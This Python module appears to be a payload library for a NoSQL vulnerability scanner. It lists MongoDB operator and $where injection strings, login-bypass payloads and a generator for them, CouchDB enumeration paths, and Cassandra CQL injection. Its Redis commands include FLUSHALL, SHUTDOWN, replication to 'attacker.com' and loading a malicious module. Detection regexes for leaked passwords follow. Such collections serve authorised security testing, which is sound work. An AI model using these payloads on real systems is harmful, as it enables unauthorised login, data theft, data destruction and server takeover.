"""
Enhanced NoSQL Injection Payloads for Generic Vulnerability Assessment

This module provides comprehensive NoSQL injection payloads for detecting
vulnerabilities in MongoDB, CouchDB, Redis, Cassandra, and other NoSQL databases.

Categories:
1. MongoDB Operator Injection
2. MongoDB JavaScript Injection
3. MongoDB Authentication Bypass
4. CouchDB Injection
5. Redis Command Injection
6. Cassandra CQL Injection
7. Generic NoSQL Patterns

Reference: OWASP Testing Guide - NoSQL Injection
"""

from typing import List, Dict, Any
from dataclasses import dataclass


# =============================================================================
# MONGODB OPERATOR INJECTION
# =============================================================================

# $where, $regex, $gt, $lt, $ne, $or, $and operator abuse
MONGODB_OPERATOR_PAYLOADS: List[str] = [
    # Authentication bypass with $ne (not equal)
    '{"$ne": ""}',
    '{"$ne": null}',
    '{"$ne": 1}',
    '{"$ne": "x"}',
    '{"username": {"$ne": ""}}',
    '{"password": {"$ne": ""}}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    
    # Greater than / Less than bypass
    '{"$gt": ""}',
    '{"$gt": null}',
    '{"$gte": ""}',
    '{"$lt": "zzzzz"}',
    '{"$lte": "zzzzz"}',
    '{"password": {"$gt": ""}}',
    '{"id": {"$gt": 0}}',
    
    # $or operator for bypass
    '{"$or": [{}]}',
    '{"$or": [{"a": "a"}, {"b": "b"}]}',
    '{"$or": [{}, {"a": "a"}]}',
    '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
    '[{"$or": [{}]}]',
    
    # $and operator
    '{"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]}',
    
    # $regex for pattern matching
    '{"$regex": ".*"}',
    '{"$regex": "^a"}',
    '{"$regex": "admin"}',
    '{"username": {"$regex": ".*"}}',
    '{"password": {"$regex": ".*"}}',
    '{"$regex": ".*", "$options": "i"}',
    '{"username": {"$regex": "^admin"}}',
    
    # $exists operator
    '{"$exists": true}',
    '{"password": {"$exists": true}}',
    '{"admin": {"$exists": true}}',
    
    # $in operator
    '{"$in": []}',
    '{"$in": ["admin", "root", "administrator"]}',
    '{"role": {"$in": ["admin", "superuser"]}}',
    
    # $nin (not in)
    '{"$nin": ["blocked", "disabled"]}',
    '{"status": {"$nin": ["inactive"]}}',
    
    # $type operator
    '{"$type": 2}',  # String
    '{"$type": "string"}',
    
    # $size operator
    '{"$size": 0}',
    '{"$size": {"$gt": 0}}',
    
    # Combination attacks
    '{"$or": [{"admin": true}, {"role": "admin"}]}',
    '{"$and": [{"$or": [{"admin": true}]}, {"active": true}]}',
]


# =============================================================================
# MONGODB JAVASCRIPT INJECTION ($where)
# =============================================================================

MONGODB_WHERE_PAYLOADS: List[str] = [
    # Basic $where injection
    '{"$where": "1==1"}',
    '{"$where": "true"}',
    '{"$where": "this.password.length > 0"}',
    '{"$where": "this.username == \'admin\'"}',
    
    # Sleep/DoS payloads
    '{"$where": "sleep(5000)"}',
    '{"$where": "sleep(10000)"}',
    '{"$where": "function(){sleep(5000);return true;}"}',
    '{"$where": "(function(){sleep(5000);return true;})()"}',
    
    # Data extraction
    '{"$where": "this.password"}',
    '{"$where": "this.password.match(/.*/)"}',
    '{"$where": "this.username.match(/admin/)"}',
    
    # Boolean-based extraction
    '{"$where": "this.password.length == 1"}',
    '{"$where": "this.password.length == 2"}',
    '{"$where": "this.password[0] == \'a\'"}',
    '{"$where": "this.password.charAt(0) == \'a\'"}',
    
    # Blind time-based
    '{"$where": "if(this.username==\'admin\'){sleep(5000)}"}',
    '{"$where": "this.password.length>5?sleep(5000):1"}',
    
    # JavaScript execution
    '{"$where": "function(){return true}"}',
    '{"$where": "new Function(\'return true\')()"}',
    '{"$where": "eval(\'1+1\')"}',
    
    # Accessing global objects
    '{"$where": "this.constructor.constructor(\'return this\')()"}',
    '{"$where": "Object.keys(this)"}',
]


# =============================================================================
# MONGODB AUTHENTICATION BYPASS
# =============================================================================

MONGODB_AUTH_BYPASS_PAYLOADS: List[Dict[str, Any]] = [
    # Username/password bypass
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": "admin", "password": {"$ne": ""}},
    {"username": "admin", "password": {"$gt": ""}},
    {"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}},
    
    # Array injection
    {"username": "admin", "password": ["$ne", ""]},
    {"username[]": "admin", "password[$ne]": ""},
    
    # Null/empty bypass
    {"username": {"$ne": None}, "password": {"$ne": None}},
    {"username": {"$exists": True}, "password": {"$exists": True}},
    
    # Type confusion
    {"username": 1, "password": 1},
    {"username": True, "password": True},
    {"username": [], "password": []},
]

# String versions for injection
MONGODB_AUTH_BYPASS_STRINGS: List[str] = [
    'username[$ne]=&password[$ne]=',
    'username[$gt]=&password[$gt]=',
    'username[$regex]=.*&password[$regex]=.*',
    'username=admin&password[$ne]=',
    'username[$in][0]=admin&password[$ne]=',
    'username[$exists]=true&password[$exists]=true',
    'username[$or][0]=&password[$or][0]=',
    '{"username":{"$ne":""},"password":{"$ne":""}}',
    '{"username":{"$gt":""},"password":{"$gt":""}}',
]


# =============================================================================
# MONGODB AGGREGATION INJECTION
# =============================================================================

MONGODB_AGGREGATION_PAYLOADS: List[str] = [
    # $lookup injection (NoSQL join)
    '{"$lookup": {"from": "users", "localField": "id", "foreignField": "_id", "as": "leaked"}}',
    
    # $out injection (write to collection)
    '{"$out": "hacked"}',
    
    # $merge injection
    '{"$merge": {"into": "target"}}',
    
    # $graphLookup
    '{"$graphLookup": {"from": "users", "startWith": "$_id", "connectFromField": "_id", "connectToField": "parent", "as": "hierarchy"}}',
    
    # $project to expose fields
    '{"$project": {"password": 1, "secret": 1}}',
    
    # $match bypass
    '{"$match": {}}',
    '{"$match": {"$or": [{}]}}',
]


# =============================================================================
# COUCHDB INJECTION
# =============================================================================

COUCHDB_PAYLOADS: List[str] = [
    # _all_docs enumeration
    '/_all_docs',
    '/_all_docs?include_docs=true',
    '/_all_docs?startkey=""&endkey="\\ufff0"',
    
    # _users database access
    '/_users/_all_docs',
    '/_users/_all_docs?include_docs=true',
    
    # _config endpoint
    '/_config',
    '/_config/admins',
    '/_node/_local/_config',
    
    # View injection
    '/_design/app/_view/all',
    '/_design/users/_view/by_username',
    
    # _changes feed
    '/_changes',
    '/_changes?include_docs=true',
    
    # Database listing
    '/_all_dbs',
    
    # Replication attack
    '/_replicate',
    
    # Mango query injection
    '{"selector": {"_id": {"$gt": null}}}',
    '{"selector": {"password": {"$exists": true}}}',
    '{"selector": {"$or": [{"admin": true}, {"role": "admin"}]}}',
]


# =============================================================================
# REDIS COMMAND INJECTION
# =============================================================================

REDIS_PAYLOADS: List[str] = [
    # Basic commands
    'KEYS *',
    'INFO',
    'CONFIG GET *',
    'DEBUG SEGFAULT',
    
    # Data extraction
    'GET password',
    'GET secret_key',
    'GET admin_token',
    'HGETALL users',
    'SMEMBERS admins',
    'LRANGE sessions 0 -1',
    
    # Authentication bypass
    'AUTH password123',
    'AUTH admin',
    'AUTH ""',
    
    # Dangerous commands
    'FLUSHALL',
    'FLUSHDB',
    'SHUTDOWN',
    'SLAVEOF attacker.com 6379',
    
    # Lua script injection
    'EVAL "return redis.call(\'keys\',\'*\')" 0',
    'EVAL "return redis.call(\'config\',\'get\',\'*\')" 0',
    
    # CRLF injection in Redis protocol
    '\r\nKEYS *\r\n',
    'value\r\nSET injected true\r\n',
    
    # Module loading (RCE)
    'MODULE LOAD /tmp/malicious.so',
]


# =============================================================================
# CASSANDRA CQL INJECTION
# =============================================================================

CASSANDRA_PAYLOADS: List[str] = [
    # String termination
    "'; --",
    "' OR '1'='1",
    "' OR ''='",
    
    # ALLOW FILTERING bypass
    "ALLOW FILTERING",
    "' ALLOW FILTERING --",
    
    # Keyspace enumeration
    "SELECT * FROM system_schema.keyspaces",
    "SELECT * FROM system_schema.tables",
    "SELECT * FROM system_schema.columns",
    
    # User enumeration
    "SELECT * FROM system_auth.roles",
    "LIST ROLES",
    "LIST USERS",
    
    # Batch injection
    "'; BEGIN BATCH INSERT INTO hack (id) VALUES (1); APPLY BATCH; --",
]


# =============================================================================
# GENERIC NOSQL INJECTION PATTERNS
# =============================================================================

# URL parameter injection patterns
NOSQL_URL_PARAMS: List[str] = [
    # Bracket notation (most common)
    'param[$ne]=value',
    'param[$gt]=',
    'param[$lt]=z',
    'param[$regex]=.*',
    'param[$exists]=true',
    'param[$or][0]=value',
    'param[$in][0]=admin',
    
    # Array notation
    'param[0]=value',
    'param[]=value',
    
    # JSON in parameters
    'param={"$ne":""}',
    'param={"$gt":""}',
    'param={"$regex":".*"}',
    
    # Double encoding
    'param%5B%24ne%5D=',
    'param%5B%24gt%5D=',
    
    # Unicode encoding
    'param[\u0024ne]=',
    'param[\u0024gt]=',
]

# JSON body injection patterns
NOSQL_JSON_PAYLOADS: List[str] = [
    # Object injection
    '{"$ne": ""}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    '{"$or": [{}]}',
    
    # Nested injection
    '{"user": {"$ne": ""}}',
    '{"password": {"$ne": ""}}',
    '{"query": {"$where": "true"}}',
    
    # Array injection
    '[{"$ne": ""}]',
    '{"$or": [{"a": "a"}, {}]}',
]


# =============================================================================
# NOSQL-SPECIFIC PARAMETER NAMES
# =============================================================================

NOSQL_PRONE_PARAMETERS: List[str] = [
    # Query parameters
    "query", "q", "search", "filter", "find", "where",
    "selector", "criteria", "condition", "match",
    
    # MongoDB specific
    "$where", "$query", "$orderby", "$hint", "$explain",
    "$snapshot", "$maxScan", "$min", "$max", "$comment",
    
    # Authentication
    "username", "user", "login", "email", "password", "pass",
    "token", "apikey", "api_key", "key", "secret",
    
    # Identifiers
    "id", "_id", "uid", "userid", "user_id", "objectid",
    "docid", "document_id", "record_id",
    
    # Data operations
    "data", "payload", "body", "document", "doc",
    "update", "insert", "delete", "remove",
]


# =============================================================================
# DETECTION PATTERNS
# =============================================================================

def get_nosql_detection_patterns() -> List[str]:
    """Get regex patterns for detecting NoSQL injection success."""
    return [
        # MongoDB errors
        r"MongoError",
        r"MongoDB",
        r"BSON",
        r"ObjectId",
        r"cannot apply.*to.*object",
        r"\$where",
        r"\$regex",
        r"Mongo.*Exception",
        r"com\.mongodb",
        
        # CouchDB errors
        r"CouchDB",
        r"couchdb",
        r"_design",
        r"_view",
        r"_all_docs",
        
        # Redis errors
        r"WRONGTYPE",
        r"ERR.*operation",
        r"NOAUTH",
        r"Redis",
        
        # Generic NoSQL indicators
        r"NoSQL",
        r"Document.*not.*found",
        r"Invalid.*BSON",
        r"Cannot.*cast",
        r"Unexpected.*token",
        
        # Success indicators (data leak)
        r"_id.*:",
        r"ObjectId\(",
        r'"password"\s*:',
        r'"secret"\s*:',
        r'"admin"\s*:\s*true',
        r'"role"\s*:\s*"admin"',
    ]


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def get_nosql_payload_summary() -> Dict[str, int]:
    """Get summary of all NoSQL injection payloads."""
    return {
        "mongodb_operator": len(MONGODB_OPERATOR_PAYLOADS),
        "mongodb_where": len(MONGODB_WHERE_PAYLOADS),
        "mongodb_auth_bypass": len(MONGODB_AUTH_BYPASS_STRINGS),
        "mongodb_aggregation": len(MONGODB_AGGREGATION_PAYLOADS),
        "couchdb": len(COUCHDB_PAYLOADS),
        "redis": len(REDIS_PAYLOADS),
        "cassandra": len(CASSANDRA_PAYLOADS),
        "url_params": len(NOSQL_URL_PARAMS),
        "json_payloads": len(NOSQL_JSON_PAYLOADS),
        "prone_parameters": len(NOSQL_PRONE_PARAMETERS),
        "total_payloads": (
            len(MONGODB_OPERATOR_PAYLOADS) +
            len(MONGODB_WHERE_PAYLOADS) +
            len(MONGODB_AUTH_BYPASS_STRINGS) +
            len(MONGODB_AGGREGATION_PAYLOADS) +
            len(COUCHDB_PAYLOADS) +
            len(REDIS_PAYLOADS) +
            len(CASSANDRA_PAYLOADS) +
            len(NOSQL_URL_PARAMS) +
            len(NOSQL_JSON_PAYLOADS)
        ),
    }


def get_all_nosql_payloads() -> List[str]:
    """Get all NoSQL payloads as a flat list."""
    return (
        MONGODB_OPERATOR_PAYLOADS +
        MONGODB_WHERE_PAYLOADS +
        MONGODB_AUTH_BYPASS_STRINGS +
        MONGODB_AGGREGATION_PAYLOADS +
        COUCHDB_PAYLOADS +
        REDIS_PAYLOADS +
        CASSANDRA_PAYLOADS +
        NOSQL_URL_PARAMS +
        NOSQL_JSON_PAYLOADS
    )


def generate_nosql_auth_payloads(username_field: str = "username", password_field: str = "password") -> List[Dict[str, Any]]:
    """
    Generate NoSQL authentication bypass payloads with custom field names.
    
    Args:
        username_field: Name of username field
        password_field: Name of password field
        
    Returns:
        List of authentication bypass payload dicts
    """
    payloads = []
    
    # Basic $ne bypass
    payloads.append({username_field: {"$ne": ""}, password_field: {"$ne": ""}})
    payloads.append({username_field: {"$gt": ""}, password_field: {"$gt": ""}})
    payloads.append({username_field: {"$regex": ".*"}, password_field: {"$regex": ".*"}})
    
    # Admin targeting
    payloads.append({username_field: "admin", password_field: {"$ne": ""}})
    payloads.append({username_field: {"$in": ["admin", "root", "administrator"]}, password_field: {"$ne": ""}})
    
    # $exists bypass
    payloads.append({username_field: {"$exists": True}, password_field: {"$exists": True}})
    
    return payloads


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    # MongoDB payloads
    "MONGODB_OPERATOR_PAYLOADS",
    "MONGODB_WHERE_PAYLOADS",
    "MONGODB_AUTH_BYPASS_PAYLOADS",
    "MONGODB_AUTH_BYPASS_STRINGS",
    "MONGODB_AGGREGATION_PAYLOADS",
    
    # Other databases
    "COUCHDB_PAYLOADS",
    "REDIS_PAYLOADS",
    "CASSANDRA_PAYLOADS",
    
    # Generic patterns
    "NOSQL_URL_PARAMS",
    "NOSQL_JSON_PAYLOADS",
    "NOSQL_PRONE_PARAMETERS",
    
    # Functions
    "get_nosql_detection_patterns",
    "get_nosql_payload_summary",
    "get_all_nosql_payloads",
    "generate_nosql_auth_payloads",
]


if __name__ == "__main__":
    summary = get_nosql_payload_summary()
    print("NoSQL Injection Payload Summary:")
    for key, value in summary.items():
        print(f"  {key}: {value}")
